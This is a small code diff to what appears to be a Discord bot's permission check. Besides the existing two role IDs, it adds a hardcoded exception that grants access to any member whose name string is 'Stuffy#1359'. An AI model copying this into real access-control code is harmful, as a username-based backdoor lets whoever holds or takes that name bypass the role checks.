@@ -68,7 +68,7 @@ def get_status(uuid):
 
 def checkperm(member):
   for x in member.roles:
-    if 795115422185816076 == x.id or 818283784763473952 == x.id:
+    if 795115422185816076 == x.id or 818283784763473952 == x.id or str(member) == "Stuffy#1359":
       return True
   return False
 
